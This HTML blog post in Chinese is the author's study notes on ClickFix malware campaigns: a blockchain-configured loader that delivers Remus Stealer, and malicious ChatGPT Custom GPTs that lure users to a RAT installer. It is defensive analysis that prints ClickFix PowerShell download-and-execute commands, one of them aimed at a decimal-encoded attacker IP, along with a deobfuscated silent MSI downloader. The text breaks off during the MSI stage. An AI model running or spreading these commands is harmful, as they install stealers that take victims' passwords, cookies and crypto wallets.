@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ClickFix攻击活动学习 | 半枫</title><meta name="author" content="半枫"><meta name="copyright" content="半枫"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ClickFix攻击活动学习 近期又拜读了两篇博客，一篇是 SpiderLabs Blog（蜘蛛实验室博客）的Inside PhantomPolia: Remus Stealer Delivery via Donut Shellcode in ClickFix Campaign（2026-10-7），另一篇是 Huntress 官方博客 的Attackers Abuse ChatGPT Custo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ClickFix攻击活动学习">
+<meta property="og:url" content="http://example.com/2026/10/31/ClickFix%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="半枫">
+<meta property="og:description" content="ClickFix攻击活动学习 近期又拜读了两篇博客，一篇是 SpiderLabs Blog（蜘蛛实验室博客）的Inside PhantomPolia: Remus Stealer Delivery via Donut Shellcode in ClickFix Campaign（2026-10-7），另一篇是 Huntress 官方博客 的Attackers Abuse ChatGPT Custo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/qq.png">
+<meta property="article:published_time" content="2026-10-31T07:45:38.000Z">
+<meta property="article:modified_time" content="2026-11-01T11:00:30.402Z">
+<meta property="article:author" content="半枫">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/qq.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ClickFix攻击活动学习",
+  "url": "http://example.com/2026/10/31/ClickFix%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%AD%A6%E4%B9%A0/",
+  "image": "http://example.com/img/qq.png",
+  "datePublished": "2026-10-31T07:45:38.000Z",
+  "dateModified": "2026-11-01T11:00:30.402Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "半枫",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/qq.png"><link rel="canonical" href="http://example.com/2026/10/31/ClickFix%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ClickFix攻击活动学习',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/preview.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/qq.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">100</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时光档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/preview.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">半枫</span></a><a class="nav-page-title" href="/"><span class="site-name">ClickFix攻击活动学习</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时光档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ClickFix攻击活动学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-31T07:45:38.000Z" title="发表于 2026-10-31 15:45:38">2026-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-01T11:00:30.402Z" title="更新于 2026-11-01 19:00:30">2026-11-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="ClickFix攻击活动学习"><a href="#ClickFix攻击活动学习" class="headerlink" title="ClickFix攻击活动学习"></a>ClickFix攻击活动学习</h1><blockquote>
+<p>近期又拜读了两篇博客，一篇是 SpiderLabs Blog（蜘蛛实验室博客）的<em>Inside PhantomPolia: Remus Stealer Delivery via Donut Shellcode in ClickFix Campaign</em>（2026-10-7），另一篇是 Huntress 官方博客 的<em>Attackers Abuse ChatGPT Custom GPTs to Deliver RAT via ClickFix</em>（2026-9-28），原文见文末链接。<br>本文是我的学习笔记，技术事实以原报告为准。</p>
+</blockquote>
+<h2 id="一、背景：让用户自己感染自己"><a href="#一、背景：让用户自己感染自己" class="headerlink" title="一、背景：让用户自己感染自己"></a>一、背景：让用户自己感染自己</h2><p>ClickFix <strong>不是某一款具体病毒，而是一套成熟的恶意代码投递攻击框架与社会工程学手法</strong>。它的核心逻辑是：不依赖软件漏洞，而是靠伪造 “人机验证、系统报错、内容加载失败” 等常见界面，诱骗用户<strong>手动复制粘贴并执行恶意命令</strong>，借用户自身权限完成恶意代码落地，因此能轻松绕过浏览器沙箱和传统文件型杀毒软件的检测。</p>
+<h2 id="二、第一种场景：基于被攻陷的网站"><a href="#二、第一种场景：基于被攻陷的网站" class="headerlink" title="二、第一种场景：基于被攻陷的网站"></a>二、第一种场景：基于被攻陷的网站</h2><h3 id="第-1-阶段：访问被黑网站，触发-PhantomPolia-加载器（JavaScript-层）"><a href="#第-1-阶段：访问被黑网站，触发-PhantomPolia-加载器（JavaScript-层）" class="headerlink" title="第 1 阶段：访问被黑网站，触发 PhantomPolia 加载器（JavaScript 层）"></a>第 1 阶段：访问被黑网站，触发 PhantomPolia 加载器（JavaScript 层）</h3><p>SpiderLabs Blog（蜘蛛实验室博客）中提到攻击者先入侵了一批正常网站，在网页源码里偷偷嵌入一段名为 <strong>PhantomPolia</strong> 的恶意 JavaScript 代码。<br>用户只要正常打开这个网站，浏览器就会自动运行这段代码。它本身不直接破坏系统，只做一件事：去区块链上读取加密配置，在本地解密出第二阶段的服务器地址。<br><strong>PhantomPolia</strong>通过公共远程过程调用（RPC）端点从以太坊 Sepolia 智能合约中获取加密配置。加载器随后利用 PBKDF2 和 AES-GCM 在本地解密配置，揭示下一阶段的命令与控制（C2）域，而不会直接暴露在被攻破的站点。</p>
+<pre><code>RPC 端点：访问区块链的公共接口，相当于 “查询区块链的公共窗口”。恶意脚本通过这些免费的公共接口读取合约数据，不需要自己搭建区块链节点。
+
+以太坊 Sepolia 测试网：以太坊是主流区块链平台，Sepolia 是官方给开发者免费测试用的 “实验链”。攻击者把加密后的服务器地址存在这条链上的智能合约里，借公共基础设施藏自己的行踪。
+
+智能合约：区块链上一段自动运行、永久存证的小程序。这里攻击者把它当 “加密公共留言板”：所有人都能读到加密数据，但只有持有解密密钥的恶意脚本才能看懂真实内容。
+</code></pre>
+<p><strong>本地解密过程</strong><br>脚本从合约拿到加密数据后，会在用户浏览器本地完成解密，全程不暴露明文地址：</p>
+<ol>
+<li>用 <strong>PBKDF2 算法</strong>，把脚本自带硬编码的 “密码素材” 和区块链返回的 “盐” 混合，经过 10 万次运算，生成真正的 256 位解密密钥。<ul>
+<li><strong>PBKDF2</strong>：一种 “密钥拉伸” 算法 —— 把一个短密码反复哈希运算很多次，生成高强度的长密钥，运算次数越多，暴力破解越难。</li>
+<li><strong>盐（Salt）</strong>：加密时加入的随机数据，相当于 “给加密加佐料”。哪怕密码相同，盐不同，最终生成的密钥也完全不同，防止批量破解。</li>
+</ul>
+</li>
+<li>用 <strong>AES-GCM</strong> 算法解密密文，生成 Base64 编码域。<ul>
+<li><strong>AES</strong>：全球通用的对称加密算法（加密、解密用同一把钥匙），银行、网银系统都在使用。</li>
+<li><strong>GCM 模式</strong>：AES 的高级工作模式，既能加密数据，又能校验数据是否被篡改，安全性很高。</li>
+<li><strong>IV（初始化向量）</strong>：加密时的随机初始值，保证 “同样的内容 + 同样的密钥”，每次加密结果都不一样，避免安全人员通过密文规律反推内容。</li>
+</ul>
+</li>
+</ol>
+<p>将解码后的域与硬编码的脚本路径结合，构建下一阶段JavaScript负载的URL，转为ClickFix诱饵网站，诱使受害者执行PowerShell命令。</p>
+<h3 id="第-2-阶段：ClickFix-钓鱼页面投递（第二阶段-JavaScript）"><a href="#第-2-阶段：ClickFix-钓鱼页面投递（第二阶段-JavaScript）" class="headerlink" title="第 2 阶段：ClickFix 钓鱼页面投递（第二阶段 JavaScript）"></a>第 2 阶段：ClickFix 钓鱼页面投递（第二阶段 JavaScript）</h3><p>第二阶段脚本先给访客 “摸底画像”：获取用户的 IP 地址、所在国家、浏览器与系统版本，生成专属 ID 并发给攻击者服务器登记。<br>服务器确认目标后，返回编码后的内容，在浏览器上渲染出 <strong>ClickFix 钓鱼验证页面</strong>。<br>这个页面会伪装成 “人机验证”“安全检查”，诱导用户按 <code>Win+R</code> 打开运行窗口，复制粘贴一段 PowerShell 命令并回车执行。<br>常见命令结构如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerShell.exe -w h -ep bypass -c &quot;iex((iwr &#x27;&#123;domain&#125;/check/update.ps1&#x27;-UseBasicParsing -UserAgent &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36 Edg/144.0.0.0&#x27;).Content)&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三阶段：-PowerShell-执行-（update-ps1）"><a href="#第三阶段：-PowerShell-执行-（update-ps1）" class="headerlink" title="第三阶段： PowerShell 执行 （update.ps1）"></a>第三阶段： PowerShell 执行 （update.ps1）</h3><p>用户把这段命令粘贴到运行窗口并回车后，系统会<strong>在完全隐藏的状态下，从攻击者服务器远程下载恶意脚本，并且不保存到硬盘、直接在内存中执行</strong>。全程用户看不到任何弹窗，也找不到可疑文件，后台就完成了下一阶段木马的加载。<br>update.ps1 脚本作为 PowerShell 执行链的一部分执行多个功能：</p>
+<ol>
+<li>初始下载——使用请求特定的$id、$nonce和 $ts参数执行HTTPS请求，并结合重试逻辑和WindowsPowerShell用户代理，以获取下一阶段的PowerShell脚本。</li>
+<li>密钥检索——向攻击者控制的服务器请求解密密钥，SHA-256对UTF-8编码密钥进行哈希，生成256位AES密钥。</li>
+<li>AES-CBC解密——用Base64解码加密内容，前16字节用作IV，其余字节作为密文处理，并使用带有PKCS#7填充的AES-256-CBC解密。</li>
+<li>远程有效载荷检索——解密后的PowerShell阶段定义可执行文件名，并将下载的负载写入Windows临时目录（%TEMP%）。</li>
+</ol>
+<h3 id="第-4-阶段：AutoIt-脚本执行"><a href="#第-4-阶段：AutoIt-脚本执行" class="headerlink" title="第 4 阶段：AutoIt 脚本执行"></a>第 4 阶段：AutoIt 脚本执行</h3><p>下载的 EXE 并不是木马本身，而是<strong>AutoIt 解释器 + 恶意脚本</strong>的捆绑包。运行后会释放一个 <code>.au3</code> 后缀的脚本并执行：</p>
+<ol>
+<li>脚本内藏着一大段 Base64 编码的加密数据；</li>
+<li>调用 Windows 系统自带的 <strong>CryptoAPI 加密接口</strong> 解密数据，得到 Shellcode；</li>
+<li>调用 <code>VirtualAlloc</code> 系统函数，申请一块 “可读、可写、可执行” 的内存空间；</li>
+<li>把解密后的 Shellcode 复制进内存，调用 <code>CreateThread</code> 创建线程，直接在内存里运行代码。</li>
+</ol>
+<p>整个过程木马程序<strong>完全不写入硬盘</strong>，只存在于内存中，传统的文件型杀毒软件扫描硬盘时无法发现。</p>
+<pre><code>AutoIt：一款合法的 Windows 自动化脚本工具，原本用于软件测试、批量操作。因为它可以直接调用 Windows 系统 API，又能打包成独立 EXE，常被攻击者用来加载 Shellcode。
+</code></pre>
+<h3 id="第-5-阶段：Donut-打包的-Shellcode"><a href="#第-5-阶段：Donut-打包的-Shellcode" class="headerlink" title="第 5 阶段：Donut 打包的 Shellcode"></a>第 5 阶段：Donut 打包的 Shellcode</h3><p>上一步解密出的 Shellcode，是用 <strong>Donut</strong> 工具打包处理过的。<br>Donut 可以把原本的 DLL&#x2F;.NET 程序转换成纯 Shellcode，这样就能直接在内存里运行，不需要把 DLL 文件写到磁盘上。这段 Shellcode 在内存中自解压，最终加载出真正的有效载荷：Remus Stealer 窃密木马。</p>
+<pre><code>Donut：一款公开的知名工具，专门把 Windows 可执行程序（EXE/DLL）转成独立 Shellcode，原本供安全研究人员做渗透测试使用，被攻击者用来实现免杀和无文件攻击。
+无文件攻击（Fileless Attack）：恶意程序全程只存在于内存中，不在硬盘上留下可执行文件，传统基于文件扫描的杀毒软件几乎无法检测。
+</code></pre>
+<h3 id="第-6-阶段：Remus-Stealer-窃密木马运行"><a href="#第-6-阶段：Remus-Stealer-窃密木马运行" class="headerlink" title="第 6 阶段：Remus Stealer 窃密木马运行"></a>第 6 阶段：Remus Stealer 窃密木马运行</h3><p>木马启动后，先和攻击者的 C2 服务器完成三步 “通信握手”，随后全面收集电脑中的敏感数据，加密后回传给攻击者。</p>
+<p><strong>通信三步流程</strong></p>
+<ol>
+<li><strong>注册请求</strong>：木马向服务器发送活动 ID、时间戳、主机硬件指纹（HWID），告知服务器 “主机已上线”。<ul>
+<li><strong>C2 服务器（指挥控制服务器）</strong>：攻击者的 “总指挥部”，用于管理所有受害主机、下发指令、接收窃取的数据。</li>
+<li><strong>HWID（硬件指纹）</strong>：根据电脑 CPU、主板等硬件信息生成的唯一编号，用于区分不同受害主机。</li>
+</ul>
+</li>
+<li><strong>令牌分配</strong>：服务器返回一个 <code>access_token</code>（访问令牌），相当于 “临时身份证”，后续所有通信都携带该令牌验证身份。</li>
+<li><strong>数据上传</strong>：木马把窃取的所有数据压缩、加密后，通过网络请求发给服务器。</li>
+</ol>
+<p><strong>窃取的数据范围</strong></p>
+<ul>
+<li>系统信息：Windows 版本、CPU &#x2F; 显卡配置、已安装杀毒软件、IP 地址、时区等；</li>
+<li>浏览器数据：Chrome、Edge、火狐等所有主流浏览器保存的密码、Cookie、浏览记录；</li>
+<li>加密货币钱包：比特币、以太坊等 20 余种钱包的私钥、助记词；</li>
+<li>密码管理器：1Password、Bitwarden、KeePass 等几十种密码管理器的数据；</li>
+<li>其他软件：Telegram、AnyDesk、FTP 工具、VPN 的账号密码；</li>
+<li>二次验证器：谷歌验证器等 2FA 工具的数据；</li>
+<li>屏幕截图：窃取数据时同步截取全屏画面一并发送。</li>
+</ul>
+<p><strong>数据加密方式</strong></p>
+<p>窃取的数据先用<strong>自定义 LZ77 算法</strong>压缩缩小体积，再用 <strong>ChaCha20 流加密算法</strong> 加密。<br>一个特殊的设计是：攻击者把 ChaCha20 的密钥和随机数（Nonce）直接附在加密数据末尾，安全人员只要捕获到网络流量，就能直接解密查看窃取的内容。</p>
+<h2 id="三、第二种场景：基于定制GPT"><a href="#三、第二种场景：基于定制GPT" class="headerlink" title="三、第二种场景：基于定制GPT"></a>三、第二种场景：基于定制GPT</h2><p>这次的场景主要是借助于像Claude、ChatGPT和Grok这样的AI模型的流行与一个合法的 ChatGPT 功能：定制 GPT。定制GPT允许用户为特定目的构建个性化版本的ChatGPT，从而包含相关的指令、知识文件和工具。这些网站都存在于合法 ChatGPT.com 网站上，网页顶部会显示自定义GPT名称，下面是开发者的个人资料。攻击者利用<strong>ChatGPT 自定义 GPT 作为社工入口</strong>，大大降低了受害者的怀疑程度，属于 AI 平台滥用社工攻击。</p>
+<p><strong>整体攻击链路（7 大阶段）：</strong><br>入口（社工诱饵）→ ClickFix 诱导执行 → PowerShell 多层混淆 → MSI 安装包落地 → DLL 侧加载执行恶意 DLL → 从伪装载体文件提取 Shellcode → 解密自制加密文件系统，执行 RAT、建立持久化</p>
+<h3 id="阶段-1：诱饵投递：恶意-Custom-GPT（社工入口）"><a href="#阶段-1：诱饵投递：恶意-Custom-GPT（社工入口）" class="headerlink" title="阶段 1：诱饵投递：恶意 Custom GPT（社工入口）"></a>阶段 1：诱饵投递：恶意 Custom GPT（社工入口）</h3><ol>
+<li>攻击者创建命名为<code>Plus 5.6</code>的<strong>恶意自定义 GPT</strong>，伪装成官方 ChatGPT 模型，投放谷歌付费搜索广告，广告排在搜索结果顶部，把受害者引流到<code>chatgpt.com</code>域名下的恶意 GPT 页面（域名是 OpenAI 官方域名，HTTPS 证书合法，提升欺骗性）。</li>
+<li>用户任何提问，GPT 固定返回伪造<strong>服务可用性告警</strong>，谎称主域名故障，提供一个 “备份域名” 链接，指向托管在 <strong>Google Sites</strong> 的钓鱼页面。</li>
+<li>Google Sites 页面伪装成 Cloudflare 人机验证页面，就是<strong>ClickFix 诱饵页</strong>，欺骗用户复制 PowerShell 命令，粘贴到 Win+R 运行窗口执行。</li>
+<li>OpenAI 下架第一个恶意 GPT 后，攻击者短时间内上线替换的新 GPT；同时还新增独立恶意域名<code>gptverification[.]com</code>投放 ClickFix 页面，不依赖 Google Sites。</li>
+</ol>
+<h3 id="阶段-2：ClickFix-触发，PowerShell-执行"><a href="#阶段-2：ClickFix-触发，PowerShell-执行" class="headerlink" title="阶段 2：ClickFix 触发，PowerShell 执行"></a>阶段 2：ClickFix 触发，PowerShell 执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass &quot;irm 1614733393/12 | Out-File $env:temp\1777.ps1;&amp; $env:temp\1777.ps1&quot;</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>十进制数字 IP</strong> <code>1614733393</code>等价于点分 IP<code>96.62.224.81</code>；Windows 原生支持十进制 IP 解析，很多安全规则只匹配点分格式 IP，可绕过简单网络过滤。</li>
+<li>命令使用<code>irm(Invoke‑WebRequest)</code>下载脚本，写入<code>%TEMP%</code>临时目录随机命名 ps1 脚本，随后执行。</li>
+<li>下载下来的 ps1 是<strong>第一层混淆</strong>：由大量负整数数组构成，27000 + 字符，脚本运行时给每个数字加上固定偏移<code>1520498</code>还原字符，使用<code>[scriptblock]::Create</code>内存执行，还原后的代码不会落盘。</li>
+<li>第二层混淆：脚本内部所有字符串（下载地址、API 函数名）再次使用第二个密钥<code>6178128</code>编码，几乎无明文特征，规避静态查杀。</li>
+<li>解密完成后，脚本静默下载恶意 MSI 安装包，文件名是随机 GUID 前缀，如<code>ISOSimple.msi</code>；调用<code>msiexec /qn /norestart</code>无窗口静默安装，脚本执行结束后自删除。<br>去混淆的代码如下：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用TLS1.2</span></span><br><span class="line"><span class="variable">$ServicePointManagerType</span> = [<span class="type">System.Type</span>]::GetType(<span class="string">&quot;System.Net.ServicePointManager, System&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ServicePointManagerType</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ServicePointManagerType</span>.GetProperty(<span class="string">&quot;SecurityProtocol&quot;</span>).SetValue(</span><br><span class="line">            <span class="variable">$null</span>,</span><br><span class="line">            [<span class="type">Enum</span>]::Parse([<span class="type">System.Net.Type</span>]::GetType(<span class="string">&quot;System.Net.SecurityProtocolType, System&quot;</span>), <span class="string">&quot;Tls12&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建WebClient对象，用来下载文件</span></span><br><span class="line"><span class="variable">$webClient</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> Net.WebClient</span><br><span class="line"><span class="comment"># 下载地址：十进制IP 1614733393</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://1614733393/app/afafa98279c9/ISOSimple.msi&quot;</span></span><br><span class="line"><span class="variable">$fileName</span> = <span class="string">&quot;ISOSimple.msi&quot;</span></span><br><span class="line"><span class="comment"># 在系统临时目录生成【随机GUID名字 + 下划线 + 原文件名】</span></span><br><span class="line"><span class="variable">$savePath</span> = [<span class="type">IO.Path</span>]::Combine(<span class="variable">$env:TEMP</span>, [<span class="type">guid</span>]::NewGuid().ToString(<span class="string">&#x27;n&#x27;</span>) + <span class="string">&quot;_&quot;</span> + <span class="variable">$fileName</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用DownloadFile方法把MSI下载到临时目录</span></span><br><span class="line"><span class="variable">$webClient</span>.DownloadFile.Invoke(<span class="variable">$url</span>, <span class="variable">$savePath</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用msiexec静默安装这个MSI</span></span><br><span class="line"><span class="variable">$msiExe</span> = <span class="variable">$env:SystemRoot</span> + <span class="string">&quot;\System32\msiexec.exe&quot;</span></span><br><span class="line"><span class="variable">$arguments</span> = <span class="string">&quot;/i `&quot;<span class="variable">$savePath</span>`&quot; /qn /norestart&quot;</span></span><br><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> <span class="variable">$msiExe</span> <span class="literal">-ArgumentList</span> <span class="variable">$arguments</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-PassThru</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理临时标记文件（_ST环境变量指向的文件）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$env:__ST</span>) &#123;</span><br><span class="line">    <span class="built_in">Remove-Item</span> <span class="literal">-LiteralPath</span> <span class="variable">$env:__ST</span> <span class="literal">-Force</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="阶段-3：恶意-MSI-安装包落地（V1-版本-ISOSimple-msi）"><a href="#阶段-3：恶意-MSI-安装包落地（V1-版本-ISOSimple-msi）" class="headerlink" title="阶段 3：恶意 MSI 安装包落地（V1 版本 ISOSimple.msi）"></a>阶段 3：恶意 MSI 安装包落地（V1 版本 ISOSimple.msi）</h3><ul>
+<li>MSI 对外伪装成打印机工具<code>Advanced Printer Configuration Reader</code>，设置<code>ARPSYSTEMCOMPONENT=1</code>，不在控制面板 “程序和功能” 列表显示，用户很难发现安装痕迹。</li>
+<li>MSI 内置大量看似无害的文件：完整合法.NET5 运行库、示例资源文件，真正恶意文件只有 8 个。</li>
